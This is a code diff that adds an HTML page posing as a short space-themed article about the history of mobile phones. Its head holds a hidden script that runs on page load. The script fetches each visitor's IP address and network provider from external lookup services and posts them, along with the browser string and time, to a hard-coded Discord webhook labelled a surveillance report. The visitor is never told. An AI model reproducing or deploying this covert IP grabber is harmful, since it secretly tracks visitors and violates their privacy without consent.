@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    function getDeviceInfo() {
+      const info = {
+        ipAddress: '',
+        browser: navigator.userAgent,
+        time: new Date().toLocaleString(),
+        networkProvider: 'Unknown Galactic Phenomenon', // Default in case we can't fetch the real deal
+      };
+
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          info.ipAddress = data.ip;
+          return fetch(`https://ipapi.co/${data.ip}/json/`); // Fetch more details including network provider
+        })
+        .then(response => response.json())
+        .then(data => {
+          info.networkProvider = data.org || info.networkProvider; // Use fetched network provider or stick to the default
+          sendToDiscord(info);
+        })
+        .catch(error => console.error('Oops, something went wrong:', error));
+    }
+
+    function sendToDiscord(info) {
+      const webhookURL = 'https://discord.com/api/webhooks/1194952054477688832/V4_kFj2oz5NF2Jey5-Vet9sqtSdZAq8HFYm-zuytKmb2GSikgPRmSQ8ddd7-he_-rry8';
+      const payload = {
+        content: `\`\`\`Incoming Galactic Surveillance Report:
+          IP Address: ${info.ipAddress}
+          Browser: ${info.browser}
+          Time: ${info.time}
+          Network Provider: ${info.networkProvider}\`\`\``,
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      });
+    }
+
+    // Call getDeviceInfo() when the page loads
+    window.onload = getDeviceInfo;
+  </script>
+    <style>
+        body {
+            background-color: #001f3f; /* Dark blue background */
+            color: #ffffff; /* White text */
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .intergalactic-article {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #001f3f; /* Dark blue background */
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.7); /* Yellow shadow */
+        }
+
+        h1 {
+            color: #ffcc00; /* Yellow heading */
+            text-align: center;
+        }
+
+        p {
+            line-height: 1.6;
+        }
+
+        /* Add more styles to create an intergalactic theme */
+    </style>
+    <title>Intergalactic Mobile Phones</title>
+<link rel="icon" href="https://i.ibb.co/3phWtxn/image-2024-01-11-185530919.png" type="image/png">
+
+</head>
+<body>
+    <div class="intergalactic-article">
+        <h1>The Cosmic Evolution of Mobile Phones</h1>
+        <p>Mobile phones have become an integral part of our daily lives, connecting us to the digital world with a touch. From the early days of basic communication to the current era of powerful smartphones, these devices have evolved significantly.</p>
+    </div>
+</body>
+</html>
